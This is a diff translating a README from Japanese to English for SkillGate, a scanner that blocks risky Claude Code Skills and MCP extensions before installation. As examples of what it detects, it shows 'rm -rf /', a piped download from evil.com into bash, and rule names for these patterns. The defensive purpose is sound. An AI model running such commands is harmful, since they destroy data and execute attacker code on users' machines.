@@ -4,8 +4,7 @@
 
 **AI Agent Extension Security Gate**
 
-*Claude Code Skills・MCPサーバー・エージェント拡張のための*
-*インストール前セキュリティスキャナー*
+*Pre-installation security scanner for Claude Code Skills, MCP servers, and agent extensions*
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 [![Node.js](https://img.shields.io/badge/Node.js-20+-green.svg)](https://nodejs.org/)
@@ -16,62 +15,62 @@
 
 ---
 
-## 解決する課題
+## The Problem
 
-AIエージェントの拡張機能（Skills、MCPサーバー、プラグイン）は急速に増加していますが、これらは単なる設定ファイルではなく、**あなたのローカル環境で実行されるコード**です。
+AI agent extensions (Skills, MCP servers, plugins) are rapidly growing, but they're not just configuration files—they're **executable code running in your local environment**.
 
-あなたのマシンには以下が存在します：
-- APIキー（OpenAI、AWS、GitHub等）
-- SSH鍵
-- ブラウザの認証情報
-- `.env`ファイル
+Your machine contains:
+- API keys (OpenAI, AWS, GitHub, etc.)
+- SSH keys
+- Browser credentials
+- `.env` files
 
-**悪意のあるSkillがインストールされると、これらすべてが窃取される可能性があります。**
+**A malicious Skill can steal all of these.**
 
-SkillGateは、**インストール前にセキュリティゲートとして機能**し、危険なSkillをブロックします。
-
----
-
-## 既存ツールとの違い
-
-### 従来のセキュリティツールの限界
-
-| ツール | カテゴリ | 限界 |
-|--------|----------|------|
-| **Trivy** | コンテナ/脆弱性スキャン | AI Skill特有のパターン（markdown内コード等）を検知しない |
-| **Snyk** | 依存関係スキャン | ポリシーベースの強制（ブロック）機能がない |
-| **Gitleaks** | シークレット検出 | シークレットのみ。危険コマンドやCI設定は対象外 |
-| **Semgrep** | 静的解析 | Skill特有の攻撃パターンルールがない |
-| **npm audit** | パッケージ脆弱性 | 依存関係のみ。postinstall等の自動実行検知なし |
-
-### SkillGateのアプローチ
-
-```
-従来ツール: 「脆弱性を検出して報告」→ 人間が判断 → 見逃しリスク
-
-SkillGate: 「検出 + ポリシー評価 + 強制」→ 自動でブロック/許可/隔離
-```
+SkillGate acts as a **security gate before installation**, blocking dangerous Skills automatically.
 
 ---
 
-## SkillGateが優れている点
+## How SkillGate Differs from Existing Tools
 
-### 1. AI Skill特化の検知パターン
+### Limitations of Traditional Security Tools
 
-従来のツールはMarkdownを「ドキュメント」として無視しますが、Claude Code SkillsではMarkdownが**実行可能な指示書**として機能します。
+| Tool | Category | Limitation |
+|------|----------|------------|
+| **Trivy** | Container/vulnerability scanning | Doesn't detect AI Skill-specific patterns (code in markdown, etc.) |
+| **Snyk** | Dependency scanning | No policy-based enforcement (block/allow) |
+| **Gitleaks** | Secret detection | Secrets only. No dangerous commands or CI config scanning |
+| **Semgrep** | Static analysis | No Skill-specific attack pattern rules |
+| **npm audit** | Package vulnerabilities | Dependencies only. No postinstall auto-execution detection |
+
+### SkillGate's Approach
+
+```
+Traditional tools: "Detect and report" → Human decides → Risk of oversight
+
+SkillGate: "Detect + Policy evaluation + Enforce" → Auto block/allow/quarantine
+```
+
+---
+
+## Why SkillGate is Better
+
+### 1. AI Skill-Specific Detection Patterns
+
+Traditional tools treat Markdown as "documentation" and ignore it. But in Claude Code Skills, Markdown functions as **executable instructions**.
 
 ```markdown
-# 一般的な静的解析ツールが見逃すパターン
+# Patterns that general static analysis tools miss
 
-## Markdown内の危険コード（Skillの本体）
-rm -rf /           # ← SkillGateは検知
-curl https://evil.com/steal.sh | bash  # ← SkillGateは検知
+## Dangerous code inside Markdown (the Skill itself)
+rm -rf /           # ← SkillGate detects this
+curl https://evil.com/steal.sh | bash  # ← SkillGate detects this
 ```
 
-### 2. インストール前の強制ゲート
+### 2. Pre-Installation Enforcement Gate
 
 ```bash
-# CI/CDでの使用例
+# CI/CD usage example
 sg scan ./skill --quiet
 if [ $? -eq 1 ]; then
   echo "❌ Skill blocked - security risk detected"
@@ -80,41 +79,41 @@ fi
 echo "✅ Skill approved - proceeding with installation"
 ```
 
-| Exit Code | 判定 | アクション |
-|-----------|------|-----------|
-| `0` | ALLOW | インストール許可 |
-| `1` | BLOCK | インストール拒否 |
-| `2` | QUARANTINE | サンドボックス実行を推奨 |
-| `3` | ERROR | スキャン失敗 |
+| Exit Code | Decision | Action |
+|-----------|----------|--------|
+| `0` | ALLOW | Installation permitted |
+| `1` | BLOCK | Installation denied |
+| `2` | QUARANTINE | Sandboxed execution recommended |
+| `3` | ERROR | Scan failed |
 
-### 3. 6層の多重防御
+### 3. 6-Layer Defense in Depth
 
 ```
 ┌────────────────────────────────────────────────────────┐
-│  Secret Scanner    │ AWS鍵、GitHubトークン、APIキー   │
+│  Secret Scanner    │ AWS keys, GitHub tokens, API keys │
 ├────────────────────────────────────────────────────────┤
-│  Static Analyzer   │ eval(), exec(), 難読化           │
+│  Static Analyzer   │ eval(), exec(), obfuscation       │
 ├────────────────────────────────────────────────────────┤
-│  Skill Scanner     │ rm -rf, curl|bash, sudo, chmod   │
+│  Skill Scanner     │ rm -rf, curl|bash, sudo, chmod    │
 ├────────────────────────────────────────────────────────┤
-│  Entrypoint Detect │ postinstall, setup.py, Makefile  │
+│  Entrypoint Detect │ postinstall, setup.py, Makefile   │
 ├────────────────────────────────────────────────────────┤
-│  Dependency Scan   │ 既知脆弱性（OSV API）            │
+│  Dependency Scan   │ Known vulnerabilities (OSV API)   │
 ├────────────────────────────────────────────────────────┤
-│  CI Risk Analyzer  │ GitHub Actions危険パターン       │
+│  CI Risk Analyzer  │ GitHub Actions dangerous patterns │
 └────────────────────────────────────────────────────────┘
 ```
 
-### 4. ポリシーベースの判定
+### 4. Policy-Based Decisions
 
 ```yaml
 # skillgate.policy.yaml
 name: strict-policy
 thresholds:
-  block: 40    # スコア40以下でブロック
-  warn: 70     # スコア70以下で警告
+  block: 40    # Score <= 40 triggers block
+  warn: 70     # Score <= 70 triggers warning
 
-critical_block:  # 即座にブロック（スコア関係なし）
+critical_block:  # Immediate block (regardless of score)
   - secret_aws_access_key
   - skill_rm_rf_root
   - skill_curl_bash
@@ -126,7 +125,7 @@ rules:
     enabled: true
 ```
 
-### 5. 監査証跡の自動生成
+### 5. Automatic Audit Trail
 
 ```json
 {
@@ -142,68 +141,68 @@ rules:
 }
 ```
 
-同一入力 + 同一ポリシー = **常に同一結果**（再現性保証）
+Same input + Same policy = **Always same result** (reproducibility guaranteed)
 
 ---
 
-## いつ使うべきか
+## When to Use SkillGate
 
-### ✅ 使うべき場面
+### ✅ Use It For
 
-| シナリオ | 理由 |
-|----------|------|
-| **新しいSkillをインストールする前** | 悪意のあるコードを事前にブロック |
-| **CI/CDパイプライン** | 自動ゲートとして組み込み |
-| **チーム開発** | 承認済みSkillのみ許可するポリシー運用 |
-| **MCPサーバー導入時** | 外部サーバーの安全性を検証 |
-| **オープンソースSkillの評価** | 信頼できないソースの事前チェック |
+| Scenario | Reason |
+|----------|--------|
+| **Before installing a new Skill** | Block malicious code proactively |
+| **CI/CD pipelines** | Integrate as an automatic gate |
+| **Team development** | Policy-based approval of Skills |
+| **MCP server adoption** | Verify external server safety |
+| **Evaluating open-source Skills** | Pre-check untrusted sources |
 
-### ❌ 使わない場面
+### ❌ Don't Use It For
 
-| シナリオ | 代替ツール |
-|----------|-----------|
-| 汎用Webアプリの脆弱性診断 | Trivy, OWASP ZAP |
-| 既存コードベースの静的解析 | Semgrep, CodeQL |
-| Dockerイメージのスキャン | Trivy, Grype |
-| ペネトレーションテスト | Burp Suite, Metasploit |
+| Scenario | Alternative Tool |
+|----------|------------------|
+| General web app vulnerability scanning | Trivy, OWASP ZAP |
+| Existing codebase static analysis | Semgrep, CodeQL |
+| Docker image scanning | Trivy, Grype |
+| Penetration testing | Burp Suite, Metasploit |
 
 ---
 
-## クイックスタート
+## Quick Start
 
-### インストール
+### Installation
 
 ```bash
 git clone https://github.com/cawa102/SkillsGate.git
 cd SkillsGate
 npm install && npm run build
-npm link  # グローバルコマンドとして使用
+npm link  # Use as global command
 ```
 
-### 基本的な使い方
+### Basic Usage
 
 ```bash
-# ローカルディレクトリをスキャン
+# Scan a local directory
 sg scan ./my-skill
 
-# GitHubリポジトリをスキャン
+# Scan a GitHub repository
 sg scan https://github.com/user/skill-repo
 
-# アーカイブをスキャン
+# Scan an archive
 sg scan ./skill.zip
 
-# Markdown形式で出力
+# Output as Markdown
 sg scan ./my-skill --format markdown --output report.md
 
-# カスタムポリシーを使用
+# Use custom policy
 sg scan ./my-skill --policy ./strict.policy.yaml
 ```
 
 ---
 
-## 出力例
+## Output Examples
 
-### 安全なSkill（ALLOW）
+### Safe Skill (ALLOW)
 
 ```
 $ sg scan ./safe-skill
@@ -217,7 +216,7 @@ $ sg scan ./safe-skill
 ALLOWED: No security issues detected. Score: 100/100
 ```
 
-### 危険なSkill（BLOCK）
+### Dangerous Skill (BLOCK)
 
 ```
 $ sg scan ./malicious-skill
@@ -246,7 +245,7 @@ BLOCKED: 2 finding(s) from 2 rule(s). Score: 25/100
 
 ---
 
-## アーキテクチャ
+## Architecture
 
 ```
                     sg scan <source>
@@ -301,7 +300,7 @@ BLOCKED: 2 finding(s) from 2 rule(s). Score: 25/100
 
 ---
 
-## コマンド一覧
+## Commands
 
 ### `sg scan <source>`
 
@@ -309,11 +308,11 @@ BLOCKED: 2 finding(s) from 2 rule(s). Score: 25/100
 sg scan <source> [options]
 
 Options:
-  -o, --output <file>   出力ファイルパス
-  -f, --format <format> 出力形式 (json|markdown) [default: json]
-  -p, --policy <file>   ポリシーファイル
-  -v, --verbose         詳細出力
-  -q, --quiet           エラーのみ出力
+  -o, --output <file>   Output file path
+  -f, --format <format> Output format (json|markdown) [default: json]
+  -p, --policy <file>   Policy file to use
+  -v, --verbose         Enable verbose output
+  -q, --quiet           Suppress output except errors
 ```
 
 ### `sg init`
@@ -322,8 +321,8 @@ Options:
 sg init [options]
 
 Options:
-  -o, --output <file>  出力先 [default: skillgate.policy.yaml]
-  --force              上書き許可
+  -o, --output <file>  Output path [default: skillgate.policy.yaml]
+  --force              Overwrite existing file
 ```
 
 ### `sg validate <policy>`
@@ -335,7 +334,7 @@ sg validate ./my-policy.yaml
 
 ---
 
-## CI/CD統合
+## CI/CD Integration
 
 ### GitHub Actions
 
@@ -364,25 +363,25 @@ jobs:
 
 ---
 
-## テスト
+## Testing
 
 ```bash
-npm test                # 全テスト実行
-npm run test:coverage   # カバレッジ付き
-npm run test:watch      # ウォッチモード
+npm test                # Run all tests
+npm run test:coverage   # With coverage
+npm run test:watch      # Watch mode
 ```
 
-**テストカバレッジ:** 23ファイル、404テスト
+**Test Coverage:** 23 files, 404 tests
 
 ---
 
-## ライセンス
+## License
 
 MIT License
 
 ---
 
-## 関連リンク
+## Related Links
 
 - [Claude Code](https://claude.ai/code)
 - [MCP (Model Context Protocol)](https://modelcontextprotocol.io)
